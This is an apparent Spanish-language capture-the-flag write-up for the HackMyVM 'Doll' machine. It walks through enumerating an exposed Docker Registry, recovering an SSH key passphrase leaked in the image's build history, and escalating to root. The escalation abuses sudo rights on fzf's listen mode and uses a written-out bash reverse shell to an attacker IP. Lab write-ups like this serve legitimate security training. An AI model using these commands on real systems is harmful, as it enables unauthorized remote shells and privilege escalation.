---
title: "Doll HackMyVm - Writeup"
date: 2026-05-10 12:00:00 -0400
categories: [Writeups, HackMyVm]
tags: [web, api, docker, sudo-Misconfiguration]
image:
  path: /assets/img/HMV.png
  alt: "Doll banner"
---

En esta publicación se relatará cómo se resolvió la máquina Doll de la plataforma HackMyVM

| Autor | Dificultad | Sistema operativo | Plataforma | 
|-------|------------|-------------------|------------|
| sml | Fácil | Linux | HackMyVm |

# Resumen ejecutivo
La máquina **Doll** expone dos servicios: **SSH** en el puerto 22 y un **Docker Registry** (API 2.0) en el puerto 1007. Interactuando con la API del registry mediante `curl` se identifican los repositorios disponibles y se descarga la imagen `dolly:latest` para inspeccionarla localmente. Dentro del contenedor se encuentra el directorio home del usuario `bela`, que contiene una clave privada SSH protegida con **passphrase**. Al intentar crackearla con `ssh2john` sin éxito, se recurre a revisar el **historial de construcción de la imagen** con `docker history`, donde se descubre la passphrase `devilcollectsit` expuesta como argumento de build (`ARG passwd=devilcollectsit`), lo que permite conectarse como `bela` vía SSH. Durante la post-explotación se comprueba con `sudo -l` que el usuario puede ejecutar **`fzf`** como `root` sin contraseña; aprovechando una funcionalidad documentada en GTFOBins, se inicia `fzf` en modo escucha (`--listen=1337`) con `sudo` y se le envía una petición `curl` con el comando `execute()`, lo que lanza un script de **reverse shell** prepreparado y otorga acceso como `root`. Por estas razones la máquina está catalogada con un nivel de dificultad **fácil**.

## Hosts discovery (descubrimiento de hosts)

![](/assets/img/Doll-img/1.png)

---

## Enumeración

```bash
# Nmap 7.99 scan initiated Sat May  2 15:42:21 2026 as: /usr/lib/nmap/nmap -p 22,1007 -sCV -sS -Pn -vvv -oN nmap.txt -oX nmap.xml 192.168.0.112
Nmap scan report for doll (192.168.0.112)
Host is up, received arp-response (0.00055s latency).
Scanned at 2026-05-02 15:42:21 -04 for 21s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 d7:32:ac:40:4b:a8:41:66:d3:d8:11:49:6c:ed:ed:4b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTJXrSWPYuRFDRhOQTm8ODrNmcYkffKkOD9xodVB9AT6hwwYFzzrLUCfGlni3c/Dsn2za1vckR222GZnkqSap3H53A8KyfNBG0oblqW332wX1Cv4ytrOn8JHFAzZ5nHeOi+R7/XY/37xaDAtpSoA4K3OhVkrDr8SPuKo+/aZwB5qgCcE0qUAC4qMnPkRi4/eftDoPI1nNt4ou7GWl0k9GiuJd2BOPSw2Z1nLBRlhTYBWxgWT5k3sgwEa/wDT/W5YAgxj3XRe/xGbiBCKRBoWelBUOvzBkO6IAZ8NIW8LDobhOJ0FDmI0Pksvv3rGM0J0ZBwoV7AXTEmP4PzzHHOUyIAyq8daeuv2bndVXzDI2SCb2yvZsZU2gwL835Ch3TGHKdYkSdfPg+uKlUhG6UzkXt/5a7mocFFPAZrQ2cgJ0G/McG5EMJ9serckVShl9p1j+opQaNPgshtR5G0S2tyi+7RRz2VLP4vCazUkB4wun86n6iqYarkjSKg18ld73bH2c=
|   256 81:0e:67:f8:c3:d2:50:1e:4d:09:2a:58:11:c8:d4:95 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNfTcgZTIv9SMwaKa6F25a1aVS/RPyYOMHqHok7na6H/CYogWQkz+ipl43tBJnLmEAoFPkrTEjXhUeUdzxz5IjI=
|   256 0d:c3:7c:54:0b:9d:31:32:f2:d9:09:d3:ed:ed:93:cd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ8krwWIQC+0TmPerDUJ+StC2TAOcSjupbv9gB1JpTUU
1007/tcp open  http    syn-ack ttl 63 Docker Registry (API: 2.0)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title.
MAC Address: B4:8C:9D:DB:51:E5 (AzureWave Technology)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat May  2 15:42:42 2026 -- 1 IP address (1 host up) scanned in 21.77 seconds
```

| Vector | Servicio (Puerto) | Versión         | Qué permite                                   | Qué intentar        | Notas |
| ------ | ----------------- | --------------- | --------------------------------------------- | ------------------- | ----- |
| 1      | ssh (22)          | OpenSSH 8.4p1   | Acceso autenticado a la máquina               | Buscar credenciales |       |
| 2      | http (1007)       | Docker Registry | API para comunicarnos con imágenes de Docker  |                     |       |

### Docker Registry

Aquí tenemos un **Docker Registry**: una aplicación del lado del servidor, altamente escalable y sin estado, que actúa como un sistema de almacenamiento y distribución centralizado para imágenes de Docker.

Podemos interactuar con la API para ver repositorios e imágenes almacenadas. Para esto hice lo siguiente:

Primero listé los repositorios disponibles:

```bash
curl http://192.168.0.112:1007/v2/_catalog

{"repositories":["dolly"]}
```

Ahora las imágenes:

```bash
curl http://192.168.0.112:1007/v2/dolly/tags/list

{"name":"dolly","tags":["latest"]}
```

---

## Explotación

Lo que hice ahora fue descargar la imagen para lanzar un contenedor y buscar información importante. Fue ahí cuando encontré un usuario llamado `bella`:

![](/assets/img/Doll-img/2.png)

Al momento de entrar a la carpeta `/home` del usuario `bela` vi una carpeta `.ssh` que dentro contenía una clave `id_rsa`, pero esta tiene **passphrase**.

Una **passphrase** es una secuencia de varias palabras, a menudo una frase larga, utilizada como contraseña para acceder a sistemas, cuentas o cifrar datos.

Lo primero que hice fue extraer el hash con `ssh2john` para luego crackearlo, pero luego de un rato sin que apareciera la contraseña decidí indagar más en el contenedor. Fue ahí cuando usé `docker history` para ver el historial de creación de la imagen:

```bash
IMAGE          CREATED       CREATED BY                                      SIZE      COMMENT
119a9c7e66da   3 years ago   /bin/sh                                         7.59kB    
<missing>      3 years ago   ARG passwd=devilcollectsit                      0B        buildkit.dockerfile.v0
<missing>      3 years ago   /bin/sh -c #(nop)  CMD ["/bin/sh"]              0B        
<missing>      3 years ago   /bin/sh -c #(nop) ADD file:9a4f77dfaba7fd2aa…   7.05MB   
```

Tenemos la credencial `devilcollectsit`. Al probarla como passphrase ya podemos conectarnos como el usuario `bela`:

![](/assets/img/Doll-img/3.png)

---

## Post Explotación

Al hacer un `sudo -l` vi lo siguiente:

![](/assets/img/Doll-img/4.png)

**fzf** (fuzzy finder) es un buscador difuso interactivo para la línea de comandos, diseñado para ser rápido y versátil.
Al buscar en [GTFOBins](https://gtfobins.org/gtfobins/fzf/) encontré que es posible ejecutar comandos con la opción que precisamente tenemos permitida ejecutar como sudo.

---

## Escalada de privilegios

**Paso 1**

Preparé un archivo con el siguiente contenido para enviarnos una reverse shell hacia la máquina atacante:

```bash
#!/usr/bin/bash
bash -i >& /dev/tcp/192.168.0.131/4444 0>&1
```

**Paso 2**

Luego ejecuté el siguiente comando en la máquina víctima:

```bash
sudo /usr/bin/fzf --listen\=1337
```

**Paso 3**

En otra sesión en la máquina víctima ejecuté esta petición:

```bash
curl http://localhost:1337 -d 'execute(bash /home/bela/script.sh)'
```

**Shell como root**

Luego de enviar la petición recibo la shell como el usuario root:

![](/assets/img/Doll-img/5.png)
